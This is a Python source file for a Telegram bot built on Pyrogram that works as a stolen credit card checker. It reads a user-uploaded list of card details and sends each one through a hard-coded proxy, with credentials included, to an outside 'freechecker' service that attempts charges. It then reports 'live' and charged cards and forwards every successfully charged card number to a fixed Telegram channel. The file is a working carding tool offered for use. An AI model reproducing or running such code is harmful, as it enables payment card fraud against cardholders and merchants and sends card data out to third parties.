from pyrogram import Client, filters
import requests
import json
from EQUROBOT import app

channel_id = '-1002196680748'  # Replace with your channel ID

# Helper function to divide the amount by 100
def divide_by_100(amount):
    return amount / 100 if amount else 0

# Command handler for document
@app.on_message(filters.document)
async def handle_document(client, message):
    # Ensure the file is a .txt file
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("Please upload a .txt file containing card details.")
        return

    # Download the file
    file_path = await message.download()

    # Process the file
    with open(file_path, 'r') as file:
        card_lines = file.readlines()

    total_cards = len(card_lines)
    checked_cards = 0
    live_cards = 0
    dead_cards = 0
    charged_cards = []
    user_counts = {'charged_cc_count': 0, 'checked_cc_count': 0, 'total_cc_count': total_cards}

    for card_details in card_lines:
        card_details = card_details.strip()
        if not card_details:
            continue

        # API endpoint and parameters
        url = "https://freechecker.hrk.dev/checker"
        params = {
            'cc': card_details,
            'proxy': "50.3.137.177:12345:tickets:proxyon145"  # Replace with your proxy if needed
        }

        # Make the API request
        response = requests.get(url, params=params)
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            continue

        # Process the response
        payment_info = response_json.get('payment', {})
        status = payment_info.get('status', 'failed')
        amount = payment_info.get('amount', 0)
        divided_amount = divide_by_100(amount)
        currency = payment_info.get('currency', 'UNKNOWN')
        intent = payment_info.get('intent', 'UNKNOWN')

        if status == 'succeeded':
            live_cards += 1
            charged_cards.append((card_details, divided_amount, currency, intent))
            user_counts['charged_cc_count'] += 1

        checked_cards += 1
        user_counts['checked_cc_count'] = checked_cards

    # Send summary of the processed cards
    summary_text = (f"┏━━━━━━━⍟\n"
                    f"┃ Total Cards Checked: {checked_cards}\n"
                    f"┃ Live Cards: {live_cards}\n"
                    f"┃ Dead Cards: {dead_cards}\n"
                    f"┗━━━━━━━━━━━⊛")
    await message.reply_text(summary_text)

    # Send details of the charged cards
    for card, amount, currency, intent in charged_cards:
        success_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CHARGE {amount} {currency} ✅\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card}`\n"
                           f"➩ RESPONSE: *Payment Successful!✅*\n"
                           f"➩ PAYMENT INTENT ID: `{intent}`\n"
                           f"➩ AMOUNT: `{amount}` `{currency}`\n\n")
        await client.send_message(channel_id, success_message)
        await message.reply_text(success_message)
